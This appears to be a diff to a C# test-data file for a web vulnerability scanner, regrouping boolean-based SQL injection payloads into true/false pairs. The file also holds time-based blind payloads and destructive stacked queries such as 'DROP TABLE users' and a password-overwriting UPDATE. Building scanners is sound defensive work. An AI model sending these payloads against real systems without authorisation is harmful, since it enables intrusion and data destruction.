@@ -10,6 +10,19 @@ namespace WebVulnerabilitiesScanner.TestData
     {
         public const int TimeValueForTimeBasedBlind_s = 5;
 
+        #region Boolean-based payloads
+        private const string BooleanBasedOrStringTruePayload = "' OR '1'='1";
+        private const string BooleanBasedOrStringFalsePayload = "' OR '1'='2";
+        private const string BooleanBasedOrInlineCommentTruePayload = "' OR 1=1--";
+        private const string BooleanBasedOrInlineCommentFalsePayload = "' OR 1=2--";
+        private const string BooleanBasedOrHashCommentTruePayload = "' OR 1=1#";
+        private const string BooleanBasedOrHashCommentFalsePayload = "' OR 1=2#";
+        private const string BooleanBasedOrBlockCommentTruePayload = "' OR 1=1/*";
+        private const string BooleanBasedOrBlockCommentFalsePayload = "' OR 1=2/*";
+        private const string BooleanBasedAndInlineCommentTruePayload = "' AND 1=1--";
+        private const string BooleanBasedAndInlineCommentFalsePayload = "' AND 1=2--";
+        #endregion
+
         /// <summary>
         /// Тип портала
         /// </summary>
@@ -50,15 +63,31 @@ namespace WebVulnerabilitiesScanner.TestData
             new RequestSqlInjectionPayloadEntity($"'; WAITFOR DELAY '0:0:{TimeValueForTimeBasedBlind_s}'--", SqlInjectionType.TimeBasedBlind),
             new RequestSqlInjectionPayloadEntity($"' AND (SELECT * FROM (SELECT(SLEEP({TimeValueForTimeBasedBlind_s})))a)--", SqlInjectionType.TimeBasedBlind),
 
-            new RequestSqlInjectionPayloadEntity("' OR '1'='1", SqlInjectionType.BooleanBased),
-            new RequestSqlInjectionPayloadEntity("' OR 1=1--", SqlInjectionType.BooleanBased),
-            new RequestSqlInjectionPayloadEntity("' OR 1=1#", SqlInjectionType.BooleanBased),
-            new RequestSqlInjectionPayloadEntity("' OR 1=1/*", SqlInjectionType.BooleanBased),
-            new RequestSqlInjectionPayloadEntity("' AND 1=1--", SqlInjectionType.BooleanBased),
-            new RequestSqlInjectionPayloadEntity("' AND 1=2--", SqlInjectionType.BooleanBased),
-
             new RequestSqlInjectionPayloadEntity("'; DROP TABLE users--", SqlInjectionType.StackedQueries),
             new RequestSqlInjectionPayloadEntity("'; UPDATE users SET password='hacked'--", SqlInjectionType.StackedQueries),
+        };
+
+        /// <summary>
+        /// Пары нагрузок для корректной проверки boolean-based SQL-инъекции.
+        /// </summary>
+        public static readonly List<BooleanBasedPayloadPairEntity> BooleanBasedPayloadPairs = new List<BooleanBasedPayloadPairEntity>()
+        {
+            // Каждая пара описывает один и тот же синтаксис инъекции для истинного и ложного условия.
+            new BooleanBasedPayloadPairEntity(
+                new RequestSqlInjectionPayloadEntity(BooleanBasedOrStringTruePayload, SqlInjectionType.BooleanBased),
+                new RequestSqlInjectionPayloadEntity(BooleanBasedOrStringFalsePayload, SqlInjectionType.BooleanBased)),
+            new BooleanBasedPayloadPairEntity(
+                new RequestSqlInjectionPayloadEntity(BooleanBasedOrInlineCommentTruePayload, SqlInjectionType.BooleanBased),
+                new RequestSqlInjectionPayloadEntity(BooleanBasedOrInlineCommentFalsePayload, SqlInjectionType.BooleanBased)),
+            new BooleanBasedPayloadPairEntity(
+                new RequestSqlInjectionPayloadEntity(BooleanBasedOrHashCommentTruePayload, SqlInjectionType.BooleanBased),
+                new RequestSqlInjectionPayloadEntity(BooleanBasedOrHashCommentFalsePayload, SqlInjectionType.BooleanBased)),
+            new BooleanBasedPayloadPairEntity(
+                new RequestSqlInjectionPayloadEntity(BooleanBasedOrBlockCommentTruePayload, SqlInjectionType.BooleanBased),
+                new RequestSqlInjectionPayloadEntity(BooleanBasedOrBlockCommentFalsePayload, SqlInjectionType.BooleanBased)),
+            new BooleanBasedPayloadPairEntity(
+                new RequestSqlInjectionPayloadEntity(BooleanBasedAndInlineCommentTruePayload, SqlInjectionType.BooleanBased),
+                new RequestSqlInjectionPayloadEntity(BooleanBasedAndInlineCommentFalsePayload, SqlInjectionType.BooleanBased))
         };
 
         /// <summary>
